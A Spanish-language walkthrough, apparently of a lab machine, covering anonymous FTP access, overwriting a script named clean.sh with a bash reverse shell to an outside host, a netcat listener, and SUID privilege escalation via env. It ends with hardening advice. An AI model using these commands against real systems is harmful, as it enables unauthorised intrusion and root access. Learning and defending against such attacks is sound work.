# **Explotación de Máquina via FTP Anonymous**

![Nivel: Fácil](https://img.shields.io/badge/Nivel-Fácil-green) ![Servicio: FTP](https://img.shields.io/badge/Servicio-FTP_Anonymous-blue)

## **Descripción**
Este repositorio documenta la explotación de una máquina Linux vulnerable a través de:
1. Acceso anónimo a FTP
2. Manipulación de scripts automatizados
3. Escalada de privilegios mediante binarios SUID

**Tiempo estimado**: 20-30 minutos  
**Dificultad**: Básica  
**Sistema operativo**: Linux

## **Índice**
1. [Reconocimiento](#reconocimiento)
2. [Explotación](#explotación)
3. [Post-Explotación](#post-explotación)
4. [Conclusión](#conclusión)

## **Reconocimiento**

### 1. Escaneo Inicial
```bash
nmap -sV -p- 10.0.2.15 -oN initial_scan
```
**Hallazgos clave**:
- 21/tcp : vsftpd (FTP Anonymous permitido)

## **Explotación**

### 2. Conexión FTP Anónima
```bash
ftp 10.0.2.15
```
**Credenciales**:
- Usuario: anonymous
- Contraseña: [cualquier texto o vacío]

### 3. Manipulación de Script
```ftp
cd scripts
get clean.sh
exit
```

Editar el archivo local:
```bash
echo "bash -i >& /dev/tcp/10.0.2.4/4444 0>&1" > clean.sh
```

Subir versión modificada:
```bash
ftp 10.0.2.15
put clean.sh
```

## **Post-Explotación**

### 4. Conexión Reversa
```bash
nc -nlvp 4444
```

### 5. Mejora de Shell
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### 6. Escalada de Privilegios
```bash
find / -perm -4000 2>/dev/null
/usr/bin/env /bin/sh -p
```

## **Conclusión**

### Vulnerabilidades Críticas
1. FTP Anonymous habilitado
2. Scripts modificables por usuarios no autenticados
3. Binarios SUID mal configurados

### Hardening Recomendado
- Deshabilitar FTP Anonymous
- Restringir permisos de escritura en scripts críticos
- Eliminar permisos SUID innecesarios

> ⚠️ **Aviso Legal**: Solo para uso en entornos autorizados.

---

**Herramientas utilizadas**:
- Nmap
- FTP Client
- Netcat
- GTFOBins

**Referencias**:
- [OWASP FTP Security](https://owasp.org/www-community/vulnerabilities/FTP_Security)
- [GTFOBins env](https://gtfobins.github.io/gtfobins/env/)
